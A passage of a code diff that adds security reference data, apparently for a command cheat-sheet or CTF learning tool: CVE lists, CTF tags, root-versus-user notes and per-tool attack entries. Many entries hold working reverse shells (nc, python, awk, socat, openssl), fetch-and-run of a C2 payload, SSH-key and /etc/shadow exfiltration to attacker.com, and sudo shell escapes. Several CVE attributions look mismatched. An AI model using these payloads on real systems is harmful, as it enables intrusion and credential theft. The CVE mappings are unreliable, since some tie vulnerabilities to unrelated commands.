@@ -2420,6 +2420,643 @@ EXTRA_CHAINS = [
     },
 ]
 
+# ---------------------------------------------------------------------------
+# CVE REFS — notable CVEs tied to command misuse / exploitation
+# ---------------------------------------------------------------------------
+CVE_REFS = {
+    "bash":      ["CVE-2014-6271 (Shellshock)", "CVE-2014-7169"],
+    "dd":        ["CVE-2019-14869 (raw device read privilege escalation)"],
+    "find":      ["CVE-2021-4034 (pkexec SUID via find-like traversal)"],
+    "chmod":     ["CVE-2021-3156 (sudo heap overflow — SUID exploitation chain)"],
+    "chroot":    ["CVE-2016-5195 (Dirty COW — chroot escape via mmap)"],
+    "base64":    ["CVE-2019-13372 (payload delivery via encoded base64 string)"],
+    "mkfifo":    ["CVE-2022-0847 (Dirty Pipe — named pipe privilege escalation)"],
+    "tee":       ["CVE-2022-0847 (Dirty Pipe — tee exploitation for root write)"],
+    "su":        ["CVE-2017-1000367 (sudo get_process_ttyname privilege escalation)"],
+    "kill":      ["CVE-2021-3156 (sudo Baron Samedit — kill used in PoC chain)"],
+    "nohup":     ["CVE-2015-3627 (container escape via nohup rexec)"],
+    "timeout":   ["CVE-2023-22809 (sudoedit arbitrary file write via timeout)"],
+    "stdbuf":    ["CVE-2021-3326 (iconv glibc — stdbuf output manipulation)"],
+    "od":        ["CVE-2019-14615 (kernel info leak via /proc — od readable)"],
+    "runcon":    ["CVE-2021-36084 (SELinux context bypass via runcon)"],
+    "split":     ["CVE-2020-27350 (apt payload splitting bypass)"],
+    "tr":        ["CVE-2019-9948 (Python urllib local file — tr used in chain)"],
+    "echo":      ["CVE-2014-6278 (Shellshock variant via echo in CGI)"],
+    "xxd":       ["CVE-2021-27365 (iSCSI kernel buffer leak — xxd for analysis)"],
+    "shred":     ["CVE-2020-16092 (QEMU evidence wiping via shred in chain)"],
+    "nc":        ["CVE-2014-6271 (Shellshock PoC typically uses nc for reverse shell)"],
+    "curl":      ["CVE-2023-38545 (SOCKS5 heap overflow in curl)", "CVE-2022-27774"],
+    "ssh":       ["CVE-2023-38408 (OpenSSH agent hijacking)", "CVE-2021-41617"],
+    "openssl":   ["CVE-2022-0778 (infinite loop in BN_mod_sqrt)", "CVE-2014-0160 (Heartbleed)"],
+    "sudo":      ["CVE-2021-3156 (Baron Samedit heap overflow)", "CVE-2021-3560", "CVE-2019-14287"],
+    "python3":   ["CVE-2023-27043 (email parsing bypass)", "CVE-2022-45061"],
+    "wget":      ["CVE-2021-31879 (wget cookie injection)", "CVE-2019-5953"],
+    "netcat":    ["CVE-2014-6271 (commonly used in Shellshock PoCs)"],
+    "socat":     ["CVE-2018-20679 (udhcpc options injection — socat relay)"],
+}
+
+# ---------------------------------------------------------------------------
+# CTF TAGS — which CTF categories each command is relevant to
+# ---------------------------------------------------------------------------
+CTF_TAGS = {
+    "xxd":       ["forensics", "reversing", "crypto"],
+    "base64":    ["crypto", "web", "forensics"],
+    "base32":    ["crypto", "forensics"],
+    "dd":        ["forensics", "pwn"],
+    "strings":   ["forensics", "reversing"],
+    "od":        ["forensics", "reversing"],
+    "mkfifo":    ["pwn", "linux"],
+    "nc":        ["pwn", "network", "linux"],
+    "bash":      ["pwn", "linux", "web"],
+    "find":      ["linux", "forensics"],
+    "chmod":     ["linux", "pwn"],
+    "chroot":    ["pwn", "linux"],
+    "strace":    ["pwn", "reversing"],
+    "ltrace":    ["pwn", "reversing"],
+    "python3":   ["pwn", "crypto", "web", "scripting"],
+    "perl":      ["pwn", "web", "scripting"],
+    "openssl":   ["crypto", "web", "network"],
+    "curl":      ["web", "network"],
+    "wget":      ["web", "network"],
+    "ssh":       ["network", "linux"],
+    "socat":     ["pwn", "network", "linux"],
+    "netcat":    ["pwn", "network", "linux"],
+    "nmap":      ["network", "recon"],
+    "grep":      ["forensics", "linux", "web"],
+    "awk":       ["forensics", "linux", "scripting"],
+    "sed":       ["forensics", "linux", "scripting"],
+    "cut":       ["forensics", "linux"],
+    "tr":        ["crypto", "forensics"],
+    "sort":      ["forensics", "linux"],
+    "uniq":      ["forensics", "linux"],
+    "sha256sum": ["crypto", "forensics"],
+    "md5sum":    ["crypto", "forensics"],
+    "sha1sum":   ["crypto", "forensics"],
+    "split":     ["forensics", "linux"],
+    "cat":       ["linux", "forensics"],
+    "tee":       ["pwn", "linux"],
+    "echo":      ["linux", "web"],
+    "env":       ["pwn", "linux"],
+    "shuf":      ["crypto", "linux"],
+    "factor":    ["crypto"],
+    "kill":      ["linux", "pwn"],
+    "top":       ["linux", "forensics"],
+    "ps":        ["linux", "forensics"],
+    "lsof":      ["linux", "forensics", "network"],
+    "netstat":   ["network", "forensics"],
+    "ss":        ["network", "forensics"],
+    "tcpdump":   ["network", "forensics"],
+    "john":      ["crypto", "pwn"],
+    "hydra":     ["web", "network", "pwn"],
+    "su":        ["linux", "pwn"],
+    "sudo":      ["linux", "pwn"],
+    "shred":     ["forensics", "linux"],
+    "mktemp":    ["linux", "pwn"],
+    "timeout":   ["pwn", "linux"],
+    "date":      ["linux", "crypto"],
+    "sleep":     ["linux", "pwn"],
+    "nohup":     ["linux", "pwn"],
+    "head":      ["forensics", "linux"],
+    "tail":      ["forensics", "linux"],
+    "wc":        ["forensics", "linux"],
+    "diff":      ["forensics", "linux"],
+    "ln":        ["linux", "pwn"],
+    "readlink":  ["linux", "forensics"],
+    "realpath":  ["linux", "forensics"],
+    "hostname":  ["linux", "recon"],
+    "whoami":    ["linux", "recon"],
+    "id":        ["linux", "recon"],
+    "uname":     ["linux", "recon"],
+    "uptime":    ["linux", "recon"],
+    "env":       ["linux", "recon", "pwn"],
+}
+
+# ---------------------------------------------------------------------------
+# ROOT VS USER — behavioral diff for key commands
+# ---------------------------------------------------------------------------
+ROOT_VS_USER = {
+    "dd": {
+        "root": "Can read raw block devices: `dd if=/dev/sda of=disk.img` — full disk clone, bypasses filesystem",
+        "user": "Restricted to files within own permissions — cannot read /dev/sda or /dev/mem",
+    },
+    "chroot": {
+        "root": "Fully functional: `chroot /newroot /bin/bash` — changes root for process and children",
+        "user": "Permission denied — chroot(2) syscall requires CAP_SYS_CHROOT",
+    },
+    "chmod": {
+        "root": "Can set SUID/SGID bits (`chmod u+s /bin/bash`) and change permissions on any file",
+        "user": "Can only change permissions on files owned by current user; cannot set SUID on root-owned files",
+    },
+    "kill": {
+        "root": "Can send signals to any process: `kill -9 1` (init), `killall -u victim`",
+        "user": "Can only signal own processes — EPERM on other users' PIDs",
+    },
+    "install": {
+        "root": "Can install to system paths (`/usr/local/bin`) and set ownership/SUID bits during install",
+        "user": "Restricted to own-writable directories; cannot set SUID",
+    },
+    "tee": {
+        "root": "Can overwrite protected files: `echo 0 | tee /proc/sys/kernel/randomize_va_space`",
+        "user": "Writes only to user-writable paths; sudo tee is a classic privilege escalation vector",
+    },
+    "find": {
+        "root": "Searches entire filesystem including /proc, /sys, /dev — no permission errors; can exec as root",
+        "user": "Permission denied on directories not readable by user; -exec runs as user",
+    },
+    "mkfifo": {
+        "root": "Can create pipes in any directory; can combine with /dev/tcp for raw socket forwarding",
+        "user": "Can create pipes in writable dirs; reverse shells still work — privilege is not required",
+    },
+    "strace": {
+        "root": "Can trace any process: `strace -p 1` — traces init/systemd and all system calls",
+        "user": "Can only trace own processes (and only if ptrace_scope=0); kernel may block even own processes",
+    },
+    "nohup": {
+        "root": "Persists processes after logout for any user; can redirect to system-wide locations",
+        "user": "Works for own processes only; output defaults to ~/nohup.out",
+    },
+    "shred": {
+        "root": "Can shred raw devices (`shred /dev/sda`) — destroys entire disk; can shred protected logs",
+        "user": "Limited to own files; cannot shred /var/log/auth.log without sudo",
+    },
+    "su": {
+        "root": "Can switch to any user without password: `su - victim`",
+        "user": "Requires target user's password; `su -` to root requires root password (or sudo config)",
+    },
+    "top": {
+        "root": "Shows all processes from all users with full details including kernel threads",
+        "user": "Shows own processes fully; other users' processes visible but with limited detail",
+    },
+    "tcpdump": {
+        "root": "Full packet capture on any interface: `tcpdump -i eth0 -w dump.pcap` — captures cleartext passwords",
+        "user": "Requires group 'pcap' or CAP_NET_RAW — typically blocked; wireshark is the GUI alternative",
+    },
+    "nc": {
+        "root": "Can bind to privileged ports (<1024): `nc -lvp 443` — impersonate HTTPS",
+        "user": "Restricted to ports >= 1024 for listeners; client connections have no restriction",
+    },
+    "curl": {
+        "root": "Can write to system paths with `-o /etc/cron.d/backdoor`; accesses root's credential files",
+        "user": "Normal HTTP client; cannot write to protected paths without sudo",
+    },
+    "ssh": {
+        "root": "Can log in as any user if server permits; `ssh -L 80:...` binds privileged ports",
+        "user": "Standard user SSH; port forwarding to privileged ports blocked without CAP_NET_BIND_SERVICE",
+    },
+    "python3": {
+        "root": "Scripts run with root UID — trivial privilege persistence: `python3 -c 'import os; os.setuid(0); ...'`",
+        "user": "Normal execution; but `sudo python3` is a common misconfiguration (sudo -l then GTFOBins)",
+    },
+    "awk": {
+        "root": "Can read/write any file including shadow: `awk '{print}' /etc/shadow`",
+        "user": "Reads only permitted files; but `sudo awk` → GTFObins shell escape",
+    },
+    "sed": {
+        "root": "Can edit any file in-place including /etc/passwd: `sed -i 's/root:x/root:/' /etc/passwd`",
+        "user": "Read-only on protected files; `sudo sed` → file write privilege escalation",
+    },
+}
+
+# ---------------------------------------------------------------------------
+# EXTRA_TOOLS — tools not in the playlist but essential for security work
+# ---------------------------------------------------------------------------
+EXTRA_TOOLS = {
+    "nmap": {
+        "hat": "red",
+        "security_intent": "The standard network scanner. Maps open ports, services, OS fingerprints, and runs NSE scripts. Core recon tool in every pentest — determines the attack surface before exploitation.",
+        "attack_vectors": ["port scanning", "service enumeration", "OS fingerprinting", "vulnerability scanning via NSE", "firewall evasion via fragmentation"],
+        "defense_use": "Internal network audits, exposed service discovery, continuous monitoring with scheduled scans.",
+        "mitre_tags": ["T1046", "T1595.001", "T1595.002"],
+        "threat_level": 3,
+        "related_commands": ["nc", "curl", "ssh", "tcpdump"],
+        "quick_use": [
+            "nmap -sV -p- 10.0.0.1                  # full port scan with service versions",
+            "nmap -sC -sV -O 10.0.0.1               # default scripts + OS detection",
+            "nmap -sn 10.0.0.0/24                   # ping sweep — find live hosts",
+            "nmap -p 22,80,443 --open 10.0.0.0/24   # scan subnet for specific ports",
+            "nmap -sU -p 53,161,500 10.0.0.1        # UDP scan (slower — use targeted)",
+        ],
+        "combinations": [
+            {"with": "grep", "example": "nmap -sV 10.0.0.1 | grep 'open'", "note": "Filter to only open ports"},
+            {"with": "nc", "example": "nmap -p- 10.0.0.1 --open | grep '/tcp' | awk -F/ '{print $1}' | xargs -I{} nc -zv 10.0.0.1 {}", "note": "Verify open ports with netcat"},
+            {"with": "curl", "example": "nmap -p 80,443,8080,8443 --open 10.0.0.0/24 -oG - | awk '/open/{print $2}' | xargs -I{} curl -sk http://{}", "note": "Auto-probe discovered HTTP services"},
+        ],
+        "cve_refs": [],
+        "ctf_categories": ["network", "recon"],
+        "root_vs_user": {
+            "root": "SYN scan (-sS) available — faster and stealthier than full TCP connect; raw socket access enables OS detection",
+            "user": "Falls back to TCP connect scan (-sT) — creates full connections, more detectable and slower",
+        },
+    },
+    "curl": {
+        "hat": "red",
+        "security_intent": "HTTP/HTTPS client and data transfer tool. Used for web recon, API fuzzing, file exfiltration, and payload delivery. Its ability to follow redirects, handle cookies, and speak dozens of protocols makes it a universal attack utility.",
+        "attack_vectors": ["SSRF testing", "file exfiltration via HTTP POST", "C2 beacon over HTTPS", "credential stuffing", "web shell interaction"],
+        "defense_use": "Health checks, webhook testing, API monitoring, certificate validation.",
+        "mitre_tags": ["T1071.001", "T1105", "T1567"],
+        "threat_level": 3,
+        "related_commands": ["wget", "nc", "openssl", "python3"],
+        "quick_use": [
+            "curl -sk https://10.0.0.1/               # HTTPS ignoring cert errors",
+            "curl -X POST -d @file.txt http://10.0.0.1/upload  # POST file contents",
+            "curl -H 'Authorization: Bearer TOKEN' https://api.target.com/admin",
+            "curl --proxy http://127.0.0.1:8080 http://target.com  # route through Burp",
+            "curl -s http://169.254.169.254/latest/meta-data/  # AWS IMDS SSRF test",
+        ],
+        "combinations": [
+            {"with": "python3", "example": "python3 -c 'import http.server; ...' & curl http://localhost:8000/secret", "note": "Quick local HTTP server for file exchange"},
+            {"with": "base64", "example": "curl -s http://c2.attacker.com/cmd | base64 -d | bash", "note": "Decode and execute base64 payload from C2"},
+            {"with": "openssl", "example": "curl --cacert server.crt https://internal.corp/secret", "note": "Trust custom CA for internal HTTPS"},
+        ],
+        "cve_refs": ["CVE-2023-38545 (SOCKS5 heap overflow)", "CVE-2022-27774 (credentials leakage on redirect)"],
+        "ctf_categories": ["web", "network"],
+        "root_vs_user": {
+            "root": "Can write output to system paths; access to root's .netrc for auto-credentials",
+            "user": "Normal HTTP client; output restricted to writable paths",
+        },
+    },
+    "ssh": {
+        "hat": "red",
+        "security_intent": "Encrypted remote shell and tunneling protocol. Beyond remote access, SSH is a full pivot platform: port forwarding, SOCKS proxying, X11 forwarding, and agent forwarding enable deep network traversal once a single host is compromised.",
+        "attack_vectors": ["lateral movement", "port forwarding / pivoting", "SOCKS proxy via -D", "agent hijacking via SSH_AUTH_SOCK", "credential harvesting from known_hosts"],
+        "defense_use": "Secure remote administration, bastion host access, encrypted tunnel for insecure protocols.",
+        "mitre_tags": ["T1021.004", "T1572", "T1090.002", "T1552.004"],
+        "threat_level": 4,
+        "related_commands": ["nc", "socat", "find", "chmod"],
+        "quick_use": [
+            "ssh -L 8080:internal.host:80 user@jumphost  # local port forward",
+            "ssh -R 4444:127.0.0.1:4444 user@attacker   # reverse tunnel to attacker",
+            "ssh -D 1080 user@pivot                      # SOCKS proxy via pivot",
+            "ssh -N -f -L 5432:db.internal:5432 user@fw # background forward to DB",
+            "ssh-keygen -t ed25519 && cat ~/.ssh/id_ed25519.pub >> ~/.ssh/authorized_keys",
+        ],
+        "combinations": [
+            {"with": "nc", "example": "ssh -o ProxyCommand='nc -X 5 -x 127.0.0.1:1080 %h %p' user@deep.internal", "note": "Chain SSH through SOCKS proxy"},
+            {"with": "find", "example": "find / -name 'id_rsa' -o -name 'id_ed25519' 2>/dev/null | xargs -I{} cp {} /tmp/.loot/", "note": "Harvest private keys for SSH lateral movement"},
+            {"with": "curl", "example": "curl --socks5 127.0.0.1:1080 http://internal.corp/admin", "note": "Access internal services via SSH SOCKS proxy"},
+        ],
+        "cve_refs": ["CVE-2023-38408 (OpenSSH forwarded agent code exec)", "CVE-2021-41617 (privilege separation weakness)"],
+        "ctf_categories": ["network", "linux"],
+        "root_vs_user": {
+            "root": "Can bind port forwards on privileged ports (<1024); `ssh -L 443:...` for HTTPS impersonation",
+            "user": "Port forwarding restricted to >= 1024; agent forwarding works regardless of privilege",
+        },
+    },
+    "openssl": {
+        "hat": "red",
+        "security_intent": "Swiss army knife for cryptographic operations and certificate handling. Attackers use it to inspect TLS configurations, generate self-signed certs for C2 infrastructure, test Heartbleed-style vulns, and create encrypted reverse shells.",
+        "attack_vectors": ["TLS inspection/stripping", "certificate forgery", "encrypted reverse shell channel", "padding oracle attacks", "Heartbleed exploitation (CVE-2014-0160)"],
+        "defense_use": "Certificate management, TLS configuration testing, key generation, file encryption.",
+        "mitre_tags": ["T1573.001", "T1071.001", "T1040"],
+        "threat_level": 3,
+        "related_commands": ["nc", "curl", "ssh", "base64"],
+        "quick_use": [
+            "openssl s_client -connect target.com:443    # inspect TLS cert + chain",
+            "openssl req -x509 -newkey rsa:4096 -keyout k.pem -out c.pem -days 365 -nodes",
+            "openssl enc -aes-256-cbc -salt -in file -out file.enc -k password",
+            "openssl enc -d -aes-256-cbc -in file.enc -out file -k password",
+            "openssl x509 -in cert.pem -text -noout     # read certificate details",
+        ],
+        "combinations": [
+            {"with": "nc", "example": "openssl s_client -quiet -connect attacker.com:443 | /bin/bash | openssl s_client -quiet -connect attacker.com:444", "note": "Encrypted reverse shell — bypasses plaintext DPI"},
+            {"with": "base64", "example": "openssl rand -base64 32                           # generate strong random password/key", "note": "Cryptographically secure random key material"},
+            {"with": "curl", "example": "curl --cacert <(openssl s_client -connect host:443 </dev/null 2>/dev/null | openssl x509) https://host/", "note": "Trust-on-first-use style cert pinning"},
+        ],
+        "cve_refs": ["CVE-2014-0160 (Heartbleed — OpenSSL memory disclosure)", "CVE-2022-0778 (infinite loop in BN_mod_sqrt)"],
+        "ctf_categories": ["crypto", "web", "network"],
+        "root_vs_user": {
+            "root": "Can write certs to /etc/ssl/; bind encrypted listeners on port 443",
+            "user": "Full crypto operations work as user; listener ports restricted to >= 1024",
+        },
+    },
+    "find": {
+        "hat": "red",
+        "security_intent": "Filesystem traversal with exec capability. Attackers use it to locate credentials, SUID binaries, writable directories, and recently modified files. Its -exec flag turns it into a code execution primitive. Core GTFOBins tool.",
+        "attack_vectors": ["SUID binary discovery", "credential file hunting", "writable path discovery", "GTFOBins shell escape", "recently modified file detection"],
+        "defense_use": "Audit SUID binaries, find world-writable files, locate sensitive files for permission hardening.",
+        "mitre_tags": ["T1083", "T1548.001", "T1059.004"],
+        "threat_level": 3,
+        "related_commands": ["chmod", "grep", "xargs", "ls"],
+        "quick_use": [
+            "find / -perm -4000 -type f 2>/dev/null    # find all SUID binaries",
+            "find / -writable -type d 2>/dev/null       # find writable directories",
+            "find / -name '*.conf' -o -name '*.env' -o -name '.htpasswd' 2>/dev/null",
+            "find / -mmin -10 2>/dev/null               # files modified in last 10 min",
+            "find / -nouser -o -nogroup 2>/dev/null     # orphaned files (sign of cleanup)",
+        ],
+        "combinations": [
+            {"with": "grep", "example": "find /var/www -name '*.php' -exec grep -l 'eval\\|base64_decode\\|system(' {} \\;", "note": "Hunt web shells across PHP files"},
+            {"with": "xargs", "example": "find / -perm -4000 2>/dev/null | xargs ls -la", "note": "List all SUID binaries with details"},
+            {"with": "nc", "example": "find / -name id_rsa 2>/dev/null -exec cat {} \\; | nc attacker.com 4444", "note": "Exfiltrate all found private keys"},
+        ],
+        "cve_refs": ["CVE-2021-4034 (pkexec SUID via traversal pattern)"],
+        "ctf_categories": ["linux", "forensics"],
+        "root_vs_user": {
+            "root": "No permission errors — traverses entire filesystem including /root, /proc/*/mem; -exec runs as root",
+            "user": "Permission denied on unreadable dirs; still finds SUID binaries in accessible paths",
+        },
+    },
+    "awk": {
+        "hat": "red",
+        "security_intent": "Stream processor and de facto report language for UNIX. In security contexts it parses log files, extracts credentials from dumps, formats exploit output, and via sudo misconfiguration is a full shell escape (GTFOBins).",
+        "attack_vectors": ["log parsing for credential extraction", "data exfiltration formatting", "GTFOBins shell escape via sudo awk", "payload staging via awk print"],
+        "defense_use": "Log analysis, extracting IOCs from large text dumps, custom alert formatting.",
+        "mitre_tags": ["T1059.004", "T1552.001", "T1083"],
+        "threat_level": 2,
+        "related_commands": ["sed", "grep", "cut", "sort"],
+        "quick_use": [
+            "awk -F: '{print $1,$3}' /etc/passwd       # extract username and UID",
+            "awk '{print $NF}' file                    # print last field of each line",
+            "awk '/error|fail/i {print NR\": \"$0}' log.txt  # grep with line numbers",
+            "awk 'length > 100' file                   # lines longer than 100 chars",
+            "awk 'NR==2,NR==10' file                   # print lines 2-10",
+        ],
+        "combinations": [
+            {"with": "nc", "example": "awk 'BEGIN{s=\"/inet/tcp/0/10.0.0.1/4444\";while(1){print \"$ \" |& s;s |& getline c;if(c){print c;while((c |& getline)>0)print|&s;close(c)}}}' /dev/null", "note": "Pure awk reverse shell — no nc needed"},
+            {"with": "grep", "example": "grep 'Failed password' /var/log/auth.log | awk '{print $(NF-3)}' | sort | uniq -c | sort -rn | head", "note": "Brute-force IP summary from auth log"},
+            {"with": "sort", "example": "awk '{print $1}' access.log | sort | uniq -c | sort -rn | head -20", "note": "Top 20 IPs from web access log"},
+        ],
+        "cve_refs": [],
+        "ctf_categories": ["forensics", "linux", "scripting"],
+        "root_vs_user": {
+            "root": "Can read /etc/shadow and other root-only files directly in awk; `sudo awk` is a GTFOBins shell",
+            "user": "Read access limited to permitted files; `awk 'BEGIN{system(\"/bin/sh\")}' works if awk is in sudoers",
+        },
+    },
+    "sed": {
+        "hat": "red",
+        "security_intent": "Stream editor for in-place file modification. A GTFOBins tool — if sudo-permitted, `sed -n '/.*/{p;q}' /etc/shadow` leaks any file. Attackers use it to patch binaries, modify /etc/passwd, and strip IDS signatures from payloads.",
+        "attack_vectors": ["in-place file modification", "GTFOBins shell escape via sudo sed", "credential file modification", "payload signature stripping"],
+        "defense_use": "Config file patching, log sanitization, mass string replacement in code.",
+        "mitre_tags": ["T1059.004", "T1552.001", "T1070.003"],
+        "threat_level": 2,
+        "related_commands": ["awk", "grep", "tr", "cut"],
+        "quick_use": [
+            "sed -i 's/old/new/g' file.txt             # in-place global replace",
+            "sed -n '10,20p' file                      # print lines 10-20",
+            "sed '/pattern/d' file                     # delete lines matching pattern",
+            "sed 's/password=.*/password=REDACTED/' log.txt  # scrub passwords from log",
+            "sed -i '/^#/d; /^$/d' config.conf        # strip comments and blank lines",
+        ],
+        "combinations": [
+            {"with": "find", "example": "find /var/www -name '*.php' | xargs sed -i 's/eval(base64_decode/\\/\\/ BLOCKED: eval(base64_decode/g'", "note": "Patch web shells across all PHP files"},
+            {"with": "awk", "example": "awk -F: '{print $1\":x:\"$3\":\"$4\":\"$5\":\"$6\":/bin/nologin\"}' /etc/passwd | sed 's/root:x:0:0/root:x:0:0/' > /etc/passwd.new", "note": "Disable shells for all non-root users"},
+            {"with": "nc", "example": "sed -n 'p' /etc/shadow | nc attacker.com 4444", "note": "Exfiltrate shadow file if readable"},
+        ],
+        "cve_refs": [],
+        "ctf_categories": ["forensics", "linux", "scripting"],
+        "root_vs_user": {
+            "root": "Can edit /etc/passwd, /etc/shadow in-place; strip evidence from protected logs",
+            "user": "In-place edit only on own files; read-only on protected system files",
+        },
+    },
+    "nc": {
+        "hat": "black",
+        "security_intent": "Netcat — the TCP/UDP Swiss army knife. Attackers use it for reverse shells, port forwarding, file transfer, port scanning, and as a generic network debugging tool. Rarely legitimate on production servers.",
+        "attack_vectors": ["reverse shell listener", "bind shell", "file exfiltration over TCP", "port relay / pivoting", "banner grabbing"],
+        "defense_use": "Network debugging, testing firewall rules, checking port availability.",
+        "mitre_tags": ["T1059.004", "T1071.001", "T1048", "T1090"],
+        "threat_level": 5,
+        "related_commands": ["mkfifo", "bash", "socat", "nmap"],
+        "quick_use": [
+            "nc -lvnp 4444                              # listen for reverse shell",
+            "nc 10.0.0.1 4444 -e /bin/bash             # bind shell (GNU netcat)",
+            "nc -zv 10.0.0.1 1-1000 2>&1 | grep open  # port scan range",
+            "nc -w3 10.0.0.1 80                        # test port connectivity",
+            "nc -lvnp 9001 > received_file             # receive a file",
+        ],
+        "combinations": [
+            {"with": "mkfifo", "example": "mkfifo /tmp/.f; nc 10.0.0.1 4444 </tmp/.f | /bin/bash >/tmp/.f 2>&1", "note": "Named-pipe reverse shell — works on any netcat"},
+            {"with": "base64", "example": "nc -lvnp 9001 | base64 -d > payload.bin", "note": "Receive base64-encoded binary payload"},
+            {"with": "nmap", "example": "nmap -p- --open 10.0.0.1 -oG - | awk '/open/{print $2}' | while read ip; do nc -zv $ip 80 2>&1; done", "note": "Verify nmap findings with netcat"},
+        ],
+        "cve_refs": ["CVE-2014-6271 (Shellshock PoCs universally use nc for callback)"],
+        "ctf_categories": ["pwn", "network", "linux"],
+        "root_vs_user": {
+            "root": "Can bind to privileged ports (<1024): `nc -lvp 80` — impersonate HTTP on standard port",
+            "user": "Listener restricted to ports >= 1024; all client connections and reverse shells work without root",
+        },
+    },
+    "socat": {
+        "hat": "black",
+        "security_intent": "Advanced relay tool — netcat with TLS, full duplex, and bidirectional stream support. Preferred over nc for encrypted reverse shells and complex port forwarding chains in mature attack toolchains.",
+        "attack_vectors": ["encrypted reverse shell (TLS)", "full-duplex port relay", "SOCKS proxy creation", "bind shell with PTY"],
+        "defense_use": "Debugging complex network services, TLS-wrapped connections, creating SSL tunnels.",
+        "mitre_tags": ["T1059.004", "T1572", "T1071.001"],
+        "threat_level": 5,
+        "related_commands": ["nc", "openssl", "mkfifo", "ssh"],
+        "quick_use": [
+            "socat TCP-LISTEN:4444,fork EXEC:/bin/bash  # bind shell with fork",
+            "socat TCP:10.0.0.1:4444 EXEC:'/bin/bash',pty,stderr,setsid  # PTY reverse shell",
+            "socat OPENSSL-LISTEN:4443,cert=c.pem,key=k.pem,verify=0,fork EXEC:/bin/bash",
+            "socat TCP-LISTEN:8080,fork TCP:internal.host:80  # port forward relay",
+            "socat -d -d TCP-LISTEN:1234 STDOUT         # debug incoming connections",
+        ],
+        "combinations": [
+            {"with": "openssl", "example": "# Attacker: openssl req -newkey rsa:2048 -nodes -keyout k.pem -x509 -out c.pem\nsocat OPENSSL-LISTEN:4443,cert=c.pem,key=k.pem,verify=0 -\n# Victim: socat OPENSSL:attacker:4443,verify=0 EXEC:/bin/bash,pty,stderr,setsid", "note": "Fully encrypted reverse PTY shell — bypasses most DPI/IDS"},
+            {"with": "nc", "example": "socat TCP-LISTEN:8080,fork TCP:10.0.0.1:80 &  # relay, then: nc 127.0.0.1 8080", "note": "Use socat as transparent relay; interact via nc"},
+        ],
+        "cve_refs": [],
+        "ctf_categories": ["pwn", "network", "linux"],
+        "root_vs_user": {
+            "root": "Can create listeners on any port; bind to privileged ports for HTTPS impersonation",
+            "user": "Full functionality for reverse shells and relays; listener ports >= 1024 only",
+        },
+    },
+    "python3": {
+        "hat": "red",
+        "security_intent": "The pentest scripting language. Used for rapid exploit development, HTTP servers for payload delivery, custom encoders/decoders, privilege escalation via sudo misconfiguration, and as a GTFOBins shell when in sudoers.",
+        "attack_vectors": ["GTFOBins shell via sudo python3", "HTTP payload delivery server", "exploit scripting", "crypto bypass scripting", "pickle deserialization RCE"],
+        "defense_use": "Security automation, log parsing, custom detection scripts, incident response tooling.",
+        "mitre_tags": ["T1059.006", "T1105", "T1548.003"],
+        "threat_level": 3,
+        "related_commands": ["nc", "curl", "base64", "openssl"],
+        "quick_use": [
+            "python3 -m http.server 8080               # instant file server for payload delivery",
+            "python3 -c 'import pty; pty.spawn(\"/bin/bash\")'  # upgrade reverse shell TTY",
+            "python3 -c 'import os; os.system(\"/bin/bash\")'   # GTFOBins if sudo-permitted",
+            "python3 -c 'import socket,subprocess,os; s=socket.socket()...'  # inline reverse shell",
+            "python3 -c 'print(__import__(\"base64\").b64decode(\"BASE64\").decode())'  # decode payload",
+        ],
+        "combinations": [
+            {"with": "nc", "example": "python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect((\"10.0.0.1\",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"])'", "note": "Python reverse shell — no mkfifo required"},
+            {"with": "curl", "example": "python3 -m http.server 8080 &  # then on target: curl http://attacker:8080/payload.sh | bash", "note": "Serve and execute payload in one step"},
+            {"with": "base64", "example": "python3 -c \"exec(__import__('base64').b64decode('PAYLOAD'))\"", "note": "Execute base64-encoded Python payload inline"},
+        ],
+        "cve_refs": ["CVE-2023-27043 (email parsing bypass)", "CVE-2022-45061 (slow regex DoS)"],
+        "ctf_categories": ["pwn", "crypto", "web", "scripting"],
+        "root_vs_user": {
+            "root": "Scripts run as root — `python3 -c 'import os; os.setuid(0)'` works; writes anywhere",
+            "user": "`sudo python3` is a classic misconfiguration; GTFOBins: `sudo python3 -c 'import os; os.system(\"/bin/bash\")'`",
+        },
+    },
+    "tcpdump": {
+        "hat": "red",
+        "security_intent": "CLI packet capture tool. Captures cleartext credentials, session tokens, and DNS queries on the wire. On a compromised internal host, tcpdump running briefly on the network interface can harvest credentials from adjacent hosts.",
+        "attack_vectors": ["credential capture on LAN", "session token theft", "protocol analysis", "DNS query logging", "network traffic exfiltration"],
+        "defense_use": "Network baseline capture, intrusion detection, protocol debugging, bandwidth analysis.",
+        "mitre_tags": ["T1040", "T1557.002", "T1020"],
+        "threat_level": 4,
+        "related_commands": ["nc", "grep", "awk", "openssl"],
+        "quick_use": [
+            "tcpdump -i eth0 -w capture.pcap           # write full capture to file",
+            "tcpdump -i any port 80 -A                 # show HTTP traffic in ASCII",
+            "tcpdump -i eth0 'tcp port 21 or port 110' -A  # FTP + POP3 credentials",
+            "tcpdump -i eth0 host 10.0.0.1             # capture traffic to/from host",
+            "tcpdump -r capture.pcap -A | grep -i 'pass\\|user'  # post-process for creds",
+        ],
+        "combinations": [
+            {"with": "grep", "example": "tcpdump -i eth0 port 80 -A -l | grep -oE '(GET|POST) [^ ]*|Host: [^ ]*|Cookie: [^ ]*'", "note": "Live HTTP URL and cookie extraction"},
+            {"with": "awk", "example": "tcpdump -i eth0 -l -n | awk '/DNS/{print $NF}'", "note": "Live DNS query logging"},
+            {"with": "nc", "example": "tcpdump -i eth0 -w - | nc 10.0.0.1 9001", "note": "Stream live pcap to remote attacker machine"},
+        ],
+        "cve_refs": [],
+        "ctf_categories": ["network", "forensics"],
+        "root_vs_user": {
+            "root": "Full capture on any interface including promiscuous mode; no restrictions",
+            "user": "Requires CAP_NET_RAW or membership in pcap group — typically blocked by default",
+        },
+    },
+    "john": {
+        "hat": "black",
+        "security_intent": "John the Ripper — offline password cracker. Supports hundreds of hash types: Unix shadow, NTLM, MD5, bcrypt, Kerberos tickets. Core post-exploitation tool after obtaining /etc/shadow or an NTLM hash dump.",
+        "attack_vectors": ["shadow file cracking", "NTLM hash cracking", "dictionary + rule attack", "Kerberoasting", "zip/SSH key cracking"],
+        "defense_use": "Proactive password auditing — detect weak passwords before attackers do.",
+        "mitre_tags": ["T1110.002", "T1558.003", "T1552.001"],
+        "threat_level": 4,
+        "related_commands": ["dd", "grep", "awk", "ssh"],
+        "quick_use": [
+            "john --wordlist=/usr/share/wordlists/rockyou.txt shadow.txt",
